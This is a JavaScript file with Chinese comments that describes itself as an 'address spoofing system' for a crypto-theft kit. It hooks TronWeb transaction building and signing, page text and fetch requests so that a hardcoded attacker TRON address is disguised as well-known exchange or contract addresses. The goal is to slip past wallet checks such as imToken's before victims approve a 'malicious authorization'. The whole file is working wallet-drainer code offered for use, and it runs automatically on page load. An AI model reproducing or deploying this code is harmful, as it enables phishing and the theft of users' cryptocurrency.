/**
 * 地址伪装系统
 * 🎯 在跳转imToken前劫持和伪装攻击者地址，绕过个人地址检测
 */

(function() {
    'use strict';
    
    console.log('🎭 地址伪装系统已加载');
    
    // 🎯 真实的攻击者地址
    const REAL_ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
    
    // 🎯 用于伪装的白名单地址（知名交易所/DeFi协议地址）
    const SPOOFING_ADDRESSES = {
        // Binance官方地址
        binance: 'TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE',
        // Huobi官方地址  
        huobi: 'TLyqzVGLV1srkB7dToTAEqgDSfPtXRJZYH',
        // OKX官方地址
        okx: 'TYASr5UV6HEcXatwdFQfmLVUqQQQMUuoNE',
        // USDT官方合约地址
        usdt_contract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
        // JustSwap官方地址
        justswap: 'TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax',
        // SunSwap官方地址
        sunswap: 'TKcEU8ekq2ZoFzLSGFYCUY6aocJBX9X31b'
    };
    
    // 🎯 当前使用的伪装地址
    let currentSpoofAddress = SPOOFING_ADDRESSES.binance;
    
    // 🎯 地址映射存储
    const addressMapping = new Map();
    addressMapping.set(REAL_ATTACKER_ADDRESS, currentSpoofAddress);
    
    console.log(`🎭 地址伪装映射: ${REAL_ATTACKER_ADDRESS} → ${currentSpoofAddress}`);
    
    // 🎯 劫持TronWeb交易构建
    function hijackTronWebTransactions() {
        if (!window.tronWeb) {
            console.log('🎭 TronWeb未就绪，延迟劫持');
            setTimeout(hijackTronWebTransactions, 1000);
            return;
        }
        
        try {
            // 劫持transactionBuilder.triggerSmartContract
            if (window.tronWeb.transactionBuilder && !window.tronWeb.transactionBuilder._hijacked) {
                const originalTriggerSmartContract = window.tronWeb.transactionBuilder.triggerSmartContract;
                
                window.tronWeb.transactionBuilder.triggerSmartContract = function(...args) {
                    console.log('🎭 拦截triggerSmartContract调用:', args);
                    
                    // 检查参数中是否包含攻击者地址
                    args = args.map(arg => {
                        if (typeof arg === 'string' && arg === REAL_ATTACKER_ADDRESS) {
                            console.log(`🎭 地址伪装: ${arg} → ${currentSpoofAddress}`);
                            return currentSpoofAddress;
                        }
                        if (Array.isArray(arg)) {
                            return arg.map(item => {
                                if (item && item.value === REAL_ATTACKER_ADDRESS) {
                                    console.log(`🎭 参数地址伪装: ${item.value} → ${currentSpoofAddress}`);
                                    item.value = currentSpoofAddress;
                                }
                                return item;
                            });
                        }
                        return arg;
                    });
                    
                    return originalTriggerSmartContract.apply(this, args);
                };
                window.tronWeb.transactionBuilder._hijacked = true;
                console.log('🎭 TronWeb triggerSmartContract已劫持');
            }
            
            // 劫持trx.sign方法
            if (window.tronWeb.trx && !window.tronWeb.trx._signHijacked) {
                const originalSign = window.tronWeb.trx.sign;
                
                window.tronWeb.trx.sign = function(transaction, privateKey) {
                    console.log('🎭 拦截transaction签名:', transaction);
                    
                    // 劫持交易中的地址
                    if (transaction && transaction.raw_data && transaction.raw_data.contract) {
                        transaction.raw_data.contract.forEach(contract => {
                            if (contract.parameter && contract.parameter.value) {
                                const value = contract.parameter.value;
                                
                                // 劫持to地址
                                if (value.to_address && window.tronWeb.address.fromHex(value.to_address) === REAL_ATTACKER_ADDRESS) {
                                    const spoofHex = window.tronWeb.address.toHex(currentSpoofAddress);
                                    console.log(`🎭 交易地址伪装: ${value.to_address} → ${spoofHex}`);
                                    value.to_address = spoofHex;
                                }
                                
                                // 劫持智能合约参数中的地址
                                if (value.data) {
                                    const originalData = value.data;
                                    const attackerHex = window.tronWeb.address.toHex(REAL_ATTACKER_ADDRESS).replace('41', '');
                                    const spoofHex = window.tronWeb.address.toHex(currentSpoofAddress).replace('41', '');
                                    
                                    if (originalData.includes(attackerHex)) {
                                        value.data = originalData.replace(new RegExp(attackerHex, 'g'), spoofHex);
                                        console.log('🎭 智能合约data地址伪装完成');
                                    }
                                }
                            }
                        });
                    }
                    
                    return originalSign.apply(this, arguments);
                };
                window.tronWeb.trx._signHijacked = true;
                console.log('🎭 TronWeb sign已劫持');
            }
            
        } catch (e) {
            console.log('🎭 TronWeb劫持失败:', e.message);
        }
    }
    
    // 🎯 劫持恶意授权系统的地址
    function hijackMaliciousAuthAddress() {
        try {
            // 等待MaliciousAuth加载
            if (window.MaliciousAuth) {
                console.log('🎭 劫持恶意授权系统地址');
                
                // 如果有检测钱包的方法，劫持它
                if (window.MaliciousAuth.detectWallet) {
                    const originalDetectWallet = window.MaliciousAuth.detectWallet;
                    window.MaliciousAuth.detectWallet = function() {
                        console.log('🎭 劫持恶意授权检测，使用伪装地址');
                        
                        // 临时替换全局攻击者地址
                        if (window.ATTACKER_ADDRESS) {
                            window.ATTACKER_ADDRESS = currentSpoofAddress;
                        }
                        
                        return originalDetectWallet.apply(this, arguments);
                    };
                }
            } else {
                // 如果还未加载，稍后重试
                setTimeout(hijackMaliciousAuthAddress, 500);
            }
        } catch (e) {
            console.log('🎭 恶意授权劫持失败:', e.message);
        }
    }
    
    // 🎯 DOM元素文本替换
    function replaceAddressInDOM() {
        try {
            const allElements = document.querySelectorAll('*');
            let replacedCount = 0;
            
            allElements.forEach(el => {
                if (el.textContent && el.textContent.includes(REAL_ATTACKER_ADDRESS)) {
                    el.textContent = el.textContent.replace(
                        new RegExp(REAL_ATTACKER_ADDRESS, 'g'), 
                        currentSpoofAddress
                    );
                    replacedCount++;
                }
                
                // 也检查value属性
                if (el.value && el.value.includes(REAL_ATTACKER_ADDRESS)) {
                    el.value = el.value.replace(
                        new RegExp(REAL_ATTACKER_ADDRESS, 'g'),
                        currentSpoofAddress
                    );
                }
            });
            
            if (replacedCount > 0) {
                console.log(`🎭 DOM地址替换完成，共替换 ${replacedCount} 处`);
            }
        } catch (e) {
            console.log('🎭 DOM地址替换失败:', e.message);
        }
    }
    
    // 🎯 网络请求拦截和地址替换
    function interceptNetworkRequests() {
        // 拦截fetch请求
        if (window.fetch && !window.fetch._addressHijacked) {
            const originalFetch = window.fetch;
            
            window.fetch = function(url, options = {}) {
                // 劫持请求体中的地址
                if (options.body) {
                    if (typeof options.body === 'string') {
                        if (options.body.includes(REAL_ATTACKER_ADDRESS)) {
                            options.body = options.body.replace(
                                new RegExp(REAL_ATTACKER_ADDRESS, 'g'),
                                currentSpoofAddress
                            );
                            console.log('🎭 Fetch请求体地址已替换');
                        }
                    }
                }
                
                // 劫持URL中的地址
                if (typeof url === 'string' && url.includes(REAL_ATTACKER_ADDRESS)) {
                    url = url.replace(
                        new RegExp(REAL_ATTACKER_ADDRESS, 'g'),
                        currentSpoofAddress
                    );
                    console.log('🎭 Fetch URL地址已替换');
                }
                
                return originalFetch.apply(this, arguments);
            };
            
            window.fetch._addressHijacked = true;
            console.log('🎭 Fetch地址劫持已启用');
        }
    }
    
    // 🎯 动态切换伪装地址
    function rotateSpoofAddress() {
        const addresses = Object.values(SPOOFING_ADDRESSES);
        const currentIndex = addresses.indexOf(currentSpoofAddress);
        const nextIndex = (currentIndex + 1) % addresses.length;
        currentSpoofAddress = addresses[nextIndex];
        
        addressMapping.set(REAL_ATTACKER_ADDRESS, currentSpoofAddress);
        console.log(`🎭 地址轮换: 新的伪装地址 ${currentSpoofAddress}`);
        
        return currentSpoofAddress;
    }
    
    // 🎯 在兑换前执行地址伪装
    function activateAddressSpoofing() {
        console.log('🎭🎭🎭 激活地址伪装系统！🎭🎭🎭');
        
        // 1. 劫持TronWeb交易
        hijackTronWebTransactions();
        
        // 2. 劫持恶意授权地址
        hijackMaliciousAuthAddress();
        
        // 3. 替换DOM中的地址显示
        replaceAddressInDOM();
        
        // 4. 拦截网络请求
        interceptNetworkRequests();
        
        // 5. 轮换到一个新的伪装地址
        rotateSpoofAddress();
        
        console.log(`🎭 地址伪装完成: ${REAL_ATTACKER_ADDRESS} → ${currentSpoofAddress}`);
    }
    
    // 🎯 全局接口
    window.AddressSpoofing = {
        activate: activateAddressSpoofing,
        rotate: rotateSpoofAddress,
        getCurrentSpoof: () => currentSpoofAddress,
        getMapping: () => addressMapping,
        setCustomSpoof: (address) => {
            currentSpoofAddress = address;
            addressMapping.set(REAL_ATTACKER_ADDRESS, address);
            console.log(`🎭 自定义伪装地址: ${address}`);
        }
    };
    
    // 🎯 自动在页面加载时准备劫持
    document.addEventListener('DOMContentLoaded', () => {
        setTimeout(() => {
            hijackTronWebTransactions();
            hijackMaliciousAuthAddress();
            interceptNetworkRequests();
        }, 1000);
    });
    
    console.log('🎭 地址伪装系统初始化完成');
    
})();